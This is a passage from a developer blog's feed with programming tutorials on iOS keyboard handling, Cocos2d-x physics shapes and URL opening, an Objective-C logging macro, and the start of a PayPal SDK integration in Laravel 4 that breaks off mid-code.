class="type">void</span>)keyboardWillHide:(<span class="built_in">NSNotification</span> *)notification</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 7.</span></span><br><span class="line">    [_dummyView removeConstraint:_dummyViewHeightConstraint];</span><br><span class="line">    </span><br><span class="line">    _dummyViewHeightConstraint = [<span class="built_in">NSLayoutConstraint</span> constraintWithItem:_dummyView</span><br><span class="line">                                              attribute:<span class="built_in">NSLayoutAttributeHeight</span></span><br><span class="line">                                              relatedBy:<span class="built_in">NSLayoutRelationEqual</span></span><br><span class="line">                                                 toItem:<span class="literal">nil</span></span><br><span class="line">                                              attribute:<span class="built_in">NSLayoutAttributeNotAnAttribute</span></span><br><span class="line">                                             multiplier:<span class="number">1.0</span>f</span><br><span class="line">                                               constant:<span class="number">0</span>];</span><br><span class="line">    [_dummyView addConstraint:_dummyViewHeightConstraint];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the case above, you have a <code>UIScrollView</code> in your ViewController, and a <code>UITextField</code> inside the <code>UIScrollView</code>.</p><p>I remention the problem here, when the <code>textField</code> on focus, the keyboard will brought up, and the <code>scrollView</code>‘s contentSize still the same,<br>the keyboard may blocked the <code>textField</code> and become invisible, yet it cannot scroll up.</p><p>Let’s begin to solve this</p><ol><li>Declare 2 ivars, a dummy view &amp; it’s height constraint.</li><li>Initialize all views, and make sure <code>translatesAutoresizingMaskIntoConstraints</code> is set to <code>NO</code> for all views that wanted to use auto layout.</li><li>Add constraints to all these view. The <code>matrics</code> is actually variables that wanted to use inside the constraints’ visual format.</li><li>Initialize the dummy view’s height constraint separately to that ivar. Since it is dummy, so set the height <em>(refer the <code>constant</code> argument)</em> to 0.</li><li>Remember to add keyboard’s notification <em>(listen to keyboard’s event)</em></li><li>When the keyboard is shown, remove the dummy view’s constraint first, then set the dummy view’s height to keyboard’s height, then only add the height constraint back to the dummy view.</li><li>When keyboard is hide, do the same thing with <strong>6</strong>, but the <code>constant</code> now is <strong>0</strong>.</li></ol><p>Run it, and it will works as expected. Enjoy :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I believe there are many people are facing this problem. Last time my approach was to change the the &lt;code&gt;scrollView&lt;/code&gt;‘s</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
    <category term="objective-c" scheme="http://jslim.net/tags/objective-c/"/>
    
  </entry>
  
  <entry>
    <title>Cocos2d-x V3 accurate physics body shape with PhysicsEditor</title>
    <link href="http://jslim.net/blog/2014/10/09/cocos2d-x-v3-accurate-physics-body-shape-with-physicseditor/"/>
    <id>http://jslim.net/blog/2014/10/09/cocos2d-x-v3-accurate-physics-body-shape-with-physicseditor/</id>
    <published>2014-10-09T15:56:36.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I mention about <a href="/blog/2014/09/12/create-spritesheet-for-cocos2d-x-using-with-texturepacker/">TexturePacker in my previous post</a>.<br>Now is <a href="https://www.codeandweb.com/physicseditor">PhysicsEditor</a>.</p><p><img src="/images/posts/2014-10-10-cocos2d-x-v3-accurate-physics-body-shape-with-physicseditor/PhysicsEditor-logo.png" alt="PhysicsEditor"></p><h2 id="Create-a-physics-file"><a href="#Create-a-physics-file" class="headerlink" title="Create a physics file"></a>Create a physics file</h2><p>First of all, create a physics file with PhysicsEditor. Just drag image(s) to the left pane.</p><p><img src="/images/posts/2014-10-10-cocos2d-x-v3-accurate-physics-body-shape-with-physicseditor/drag.png" alt="Drag images to PhysicsEditor"></p><p><img src="/images/posts/2014-10-10-cocos2d-x-v3-accurate-physics-body-shape-with-physicseditor/select-shape.png" alt="Traverse body shape"></p><ol><li>Set the <strong>Exporter</strong> to <code>Chipmunk generic (PLIST) - BETA</code></li><li>Set the <strong>Relative</strong> both values to <code>0.5</code> to move the anchor point to the center</li><li>Click on that icon</li></ol><p><img src="/images/posts/2014-10-10-cocos2d-x-v3-accurate-physics-body-shape-with-physicseditor/adjust-tolerance.png" alt="Adjust tolerance"></p><p>You will see the face is highlighted, PhysicsEditor helps you to generate vertices/points of the image.<br>You can change the tolerance value <em>(by default is <code>1</code>)</em>, of course, the lower the better, but will be slower <em>(theoretically)</em>.</p><p><img src="/images/posts/2014-10-10-cocos2d-x-v3-accurate-physics-body-shape-with-physicseditor/highlighted.png" alt="Image highlighted"></p><p>Once you have done, the image is now highlighted with its shape.</p><p><img src="/images/posts/2014-10-10-cocos2d-x-v3-accurate-physics-body-shape-with-physicseditor/publish.png" alt="Publish physics"></p><p>Publish it as <code>.plist</code> file. You have done the part.</p><h2 id="Add-the-physics-file-to-Xcode-project"><a href="#Add-the-physics-file-to-Xcode-project" class="headerlink" title="Add the physics file to Xcode project"></a>Add the physics file to Xcode project</h2><p><img src="/images/posts/2014-10-10-cocos2d-x-v3-accurate-physics-body-shape-with-physicseditor/create-folder-references.png" alt="Add physics to Xcode"></p><p>Drag the published file to Xcode file pane and select <code>Create folder references</code>.</p><p><img src="/images/posts/2014-10-10-cocos2d-x-v3-accurate-physics-body-shape-with-physicseditor/file-pane.png" alt="File inspector"></p><p>It will looks like this.</p><h2 id="Test-it-out-in-code"><a href="#Test-it-out-in-code" class="headerlink" title="Test it out in code"></a>Test it out in code</h2><p>Before actually use the physics file, let’s try with the default API. Edit <strong>HelloWorldScene.cpp</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> spriteBody = PhysicsBody::<span class="built_in">createBox</span>(sprite-&gt;<span class="built_in">getContentSize</span>());</span><br><span class="line">sprite-&gt;<span class="built_in">setPhysicsBody</span>(spriteBody);</span><br></pre></td></tr></table></figure><p><img src="/images/posts/2014-10-10-cocos2d-x-v3-accurate-physics-body-shape-with-physicseditor/rectangle-shape.png" alt="Rectangle shape"></p><p>It is rectangle.</p><p>Now, add <a href="https://raw.githubusercontent.com/jslim89/Cocos2d-x-PhysicsEditor-demo/master/Classes/PEShapeCache_X3_0.h">PEShapeCache_X3_0.h</a> and <a href="https://raw.githubusercontent.com/jslim89/Cocos2d-x-PhysicsEditor-demo/master/Classes/PEShapeCache_X3_0.cpp">PEShapeCache_X3_0.cpp</a> to project <em>(credit: <a href="https://github.com/baibai2013/PhysicsEditor-Loader-for-cocos2d-x-3.0">https://github.com/baibai2013/PhysicsEditor-Loader-for-cocos2d-x-3.0</a>)</em>.</p><p>Update <strong>AppDelegate.cpp</strong>, add the physics file you generated just now to cache</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AppDelegate.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;HelloWorldScene.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;PEShapeCache_X3_0.h&quot;</span> <span class="comment">// Make sure you include it</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">AppDelegate::applicationDidFinishLaunching</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// after if (!glview) &#123; ... &#125;</span></span><br><span class="line"></span><br><span class="line">    PEShapeCache::<span class="built_in">getInstance</span>()-&gt;<span class="built_in">addBodysWithFile</span>(<span class="string">&quot;physics/body.plist&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Then in <strong>HelloWorldScene.cpp</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;HelloWorldScene.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;PEShapeCache_X3_0.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">HelloWorld::init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">auto</span> spriteBody = PEShapeCache::<span class="built_in">getInstance</span>()-&gt;<span class="built_in">getPhysicsBodyByName</span>(<span class="string">&quot;2dx&quot;</span>); <span class="comment">// the name you put in PhysicsEditor</span></span><br><span class="line">    sprite-&gt;<span class="built_in">setPhysicsBody</span>(spriteBody);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Then finally you get</p><p><img src="/images/posts/2014-10-10-cocos2d-x-v3-accurate-physics-body-shape-with-physicseditor/custom-shape.png" alt="Custom shape"></p><p>Although it is not perfect yet, but it basically solve the issue that I faced. Will continue to seek for solution to make it perfect :)</p><p>I created a demo project, please refer to <a href="https://github.com/jslim89/Cocos2d-x-PhysicsEditor-demo">Cocos2d-x-PhysicsEditor-demo</a>.</p><p><em>References:</em></p><ul><li><em><a href="http://discuss.cocos2d-x.org/t/cocos3-0-tutorial-accurate-hit-testing-with-cocos2d-x-3-0-integrated-physics-feature/13393">[Cocos3.0 Tutorial] Accurate hit testing with Cocos2d-x 3.0 integrated physics feature</a></em></li><li><em><a href="http://www.58player.com/blog-2479-100819.html">cocos2d-x 3.0 PhysicsEditor 加载plist PEShapeCache_X3_0</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I mention about &lt;a href=&quot;/blog/2014/09/12/create-spritesheet-for-cocos2d-x-using-with-texturepacker/&quot;&gt;TexturePacker in my previous</summary>
        
      
    
    
    
    
    <category term="cocos2d-x" scheme="http://jslim.net/tags/cocos2d-x/"/>
    
  </entry>
  
  <entry>
    <title>Objective C macro - logging wrapper</title>
    <link href="http://jslim.net/blog/2014/09/23/objective-c-macro-logging-wrapper/"/>
    <id>http://jslim.net/blog/2014/09/23/objective-c-macro-logging-wrapper/</id>
    <published>2014-09-23T21:28:31.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>As we know logging in Objective C is using <code>NSLog</code>. The problem here<br>is I want to enable &amp; disable the logging by changing a flag, NOT<br>remove <code>NSLog</code> when don’t want to see the log; add <code>NSLog</code> when want to<br>see the log.</p><p>There is a solution, which is <a href="https://github.com/CocoaLumberjack/CocoaLumberjack">CocoaLumberjack</a>. However, I just want to see the message in console,<br>don’t want such a huch package.</p><p>Thus I choose to use macro.</p><p>Let’s add the macro in <strong>Prefix.pch</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. the debug flag</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kDebugEnabled YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. the NSLog wrapper</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JSLog(message, ...) <span class="keyword">if</span> (kDebugEnabled) NSLog(message, ##__VA_ARGS__)</span></span><br></pre></td></tr></table></figure><ol><li>I can now turn on or off <em>(by changing the value to <code>YES</code> or <code>NO</code>)</em> at anytime</li><li>The usage is exactly same as <code>NSLog</code>. e.g. <code>JSLog(@&quot;error %@&quot;, error);</code></li></ol>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;As we know logging in Objective C is using &lt;code&gt;NSLog&lt;/code&gt;. The problem here&lt;br&gt;is I want to enable &amp;amp; disable the logging by</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Cocos2d-x v3 open URL</title>
    <link href="http://jslim.net/blog/2014/09/23/cocos2d-x-v3-open-url/"/>
    <id>http://jslim.net/blog/2014/09/23/cocos2d-x-v3-open-url/</id>
    <published>2014-09-23T16:13:34.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>In Cocos2d-x <em>(I’m using version 3)</em>, there is no built-in method to open an external URL. However, this can be achieved. Here I’m only showing on iOS &amp; Android platform.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cd <span class="regexp">/path/</span>to/game</span><br><span class="line">$ ls</span><br><span class="line">cocos2d<span class="regexp">/       proj.ios_mac/</span>  proj.win32<span class="regexp">/     res/</span>  CMakeLists.txt</span><br><span class="line">proj.android<span class="regexp">/  proj.linux/</span>    proj.wp8-xaml<span class="regexp">/  src/</span></span><br></pre></td></tr></table></figure><p>Now, this has to change the <strong>cocos2d</strong>‘s core files.</p><h2 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h2><p>Edit the <strong>./cocos2d/cocos/platform/ios/CCApplication.h</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">openURL</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *url)</span></span>; <span class="comment">// ADD THIS LINE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Then edit <strong>./cocos2d/cocos/platform/ios/CCApplication.mm</strong>, add the implementation for that method <code>openURL</code></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">void</span> Application::openURL(<span class="keyword">const</span> <span class="type">char</span> *url)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSString</span> *urlString = [<span class="built_in">NSString</span> stringWithCString:url encoding:<span class="built_in">NSASCIIStringEncoding</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">NSURL</span> *nsURL = [<span class="built_in">NSURL</span> URLWithString:urlString];</span><br><span class="line">    [[<span class="built_in">UIApplication</span> sharedApplication] openURL:nsURL];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">NS_CC_END</span></span><br></pre></td></tr></table></figure><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><p>Edit the <strong>./cocos2d/cocos/platform/android/CCApplication.h</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">openURL</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *url)</span></span>; <span class="comment">// ADD THIS LINE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Then edit <strong>./cocos2d/cocos/platform/android/CCApplication.cpp</strong>, add the implementation for that method <code>openURL</code>. This will invoke the native Java method.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Application::openURL</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    JniMethodInfo minfo;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (JniHelper::<span class="built_in">getStaticMethodInfo</span>(minfo, <span class="string">&quot;org/cocos2dx/lib/Cocos2dxActivity&quot;</span>, <span class="string">&quot;openURL&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>)) &#123;</span><br><span class="line">        jstring StringArg1 = minfo.env-&gt;<span class="built_in">NewStringUTF</span>(url);</span><br><span class="line">        minfo.env-&gt;<span class="built_in">CallStaticVoidMethod</span>(minfo.classID, minfo.methodID, StringArg1);</span><br><span class="line">        minfo.env-&gt;<span class="built_in">DeleteLocalRef</span>(StringArg1);</span><br><span class="line">        minfo.env-&gt;<span class="built_in">DeleteLocalRef</span>(minfo.classID);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NS_CC_END</span><br></pre></td></tr></table></figure><p>Lastly edit <strong>./cocos2d/cocos/platform/android/java/src/org/cocos2dx/lib/Cocos2dxActivity.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">// import this 2 classes</span></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Activity</span> <span class="variable">me</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// ADD THIS</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Context <span class="title function_">getContext</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(<span class="keyword">final</span> Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="built_in">this</span>.init();</span><br><span class="line">        </span><br><span class="line">        me = <span class="built_in">this</span>; <span class="comment">// ADD THIS AFTER this.init()</span></span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// your openURL implementation</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">openURL</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(Intent.ACTION_VIEW);</span><br><span class="line">        i.setData(Uri.parse(url));</span><br><span class="line">        me.startActivity(i);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>You have done.</p><h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use?"></a>How to use?</h2><p>You can invoke <code>Application::getInstance()-&gt;openURL(&quot;your url&quot;)</code>. e.g.</p><p><strong>MyScene.cpp</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (Application::<span class="built_in">getInstance</span>()-&gt;<span class="built_in">getTargetPlatform</span>()) &#123;</span><br><span class="line">    <span class="keyword">case</span> Application::Platform::OS_IPAD:</span><br><span class="line">    <span class="keyword">case</span> Application::Platform::OS_IPHONE:</span><br><span class="line">        Application::<span class="built_in">getInstance</span>()-&gt;<span class="built_in">openURL</span>(<span class="string">&quot;http://www.apple.com&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">case</span> Application::Platform::OS_ANDROID:</span><br><span class="line">        Application::<span class="built_in">getInstance</span>()-&gt;<span class="built_in">openURL</span>(<span class="string">&quot;http://www.google.com&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Happy coding :)</p><p><em>Reference:</em></p><ul><li><em><a href="http://www.youtube.com/watch?v=QdrCZvOXssY">Cocos2d-x Tutorial - Opening a URL</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;In Cocos2d-x &lt;em&gt;(I’m using version 3)&lt;/em&gt;, there is no built-in method to open an external URL. However, this can be achieved. Here</summary>
        
      
    
    
    
    
    <category term="cocos2d-x" scheme="http://jslim.net/tags/cocos2d-x/"/>
    
  </entry>
  
  <entry>
    <title>Integrate PayPal SDK into Laravel 4</title>
    <link href="http://jslim.net/blog/2014/09/19/integrate-paypal-sdk-into-laravel-4/"/>
    <id>http://jslim.net/blog/2014/09/19/integrate-paypal-sdk-into-laravel-4/</id>
    <published>2014-09-19T05:45:03.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>PayPal has release an <a href="https://github.com/paypal/rest-api-sdk-php">official SDK</a> to simplify our work. Here I want to show you how to integrate into <a href="http://laravel.com/">Laravel 4</a>.</p><h2 id="1-Install-PayPal-SDK-via-composer"><a href="#1-Install-PayPal-SDK-via-composer" class="headerlink" title="1. Install PayPal SDK via composer"></a>1. Install PayPal SDK via composer</h2><p>Edit file <strong>composer.json</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        ...</span><br><span class="line"><span class="attr">&quot;paypal/rest-api-sdk-php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    ...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Update the dependencies</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> php composer.phar update --<span class="keyword">no</span>-dev</span><br></pre></td></tr></table></figure><p>You can now use the PayPal package in the project.</p><h2 id="2-Configure-PayPal"><a href="#2-Configure-PayPal" class="headerlink" title="2. Configure PayPal"></a>2. Configure PayPal</h2><p>Add a config file for paypal: <strong>app/config/paypal.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">    <span class="comment">// set your paypal credential</span></span><br><span class="line">    <span class="string">&#x27;client_id&#x27;</span> =&gt; <span class="string">&#x27;AcT3DS8a-SmTEtSl9hNcwyscoLypndD9q5L0YcfxmaUavz3p_xwFNRE-OauO&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;secret&#x27;</span> =&gt; <span class="string">&#x27;ENv8_RCXMfhcrzdSfAWjLWDiD_GJSD-Gbm5q2Pj92vIuobCtgLpR3SUxqAhZ&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * SDK configuration </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="string">&#x27;settings&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Available option &#x27;sandbox&#x27; or &#x27;live&#x27;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">&#x27;mode&#x27;</span> =&gt; <span class="string">&#x27;sandbox&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Specify the max request time in seconds</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">&#x27;http.ConnectionTimeOut&#x27;</span> =&gt; <span class="number">30</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Whether want to log to a file</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">&#x27;log.LogEnabled&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Specify the file that want to write on</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">&#x27;log.FileName&#x27;</span> =&gt; <span class="title function_ invoke__">storage_path</span>() . <span class="string">&#x27;/logs/paypal.log&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Available option &#x27;FINE&#x27;, &#x27;INFO&#x27;, &#x27;WARN&#x27; or &#x27;ERROR&#x27;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * Logging is most verbose in the &#x27;FINE&#x27; level and decreases as you</span></span><br><span class="line"><span class="comment">         * proceed towards ERROR</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">&#x27;log.LogLevel&#x27;</span> =&gt; <span class="string">&#x27;FINE&#x27;</span></span><br><span class="line">    ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>Setup in <strong>app/controllers/IndexController.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Rest</span>\<span class="title">ApiContext</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Auth</span>\<span class="title">OAuthTokenCredential</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Api</span>\<span class="title">Amount</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Api</span>\<span class="title">Details</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Api</span>\<span class="title">Item</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Api</span>\<span class="title">ItemList</span>;</span><br><span class="line"><span class="keyword">use</span> <span 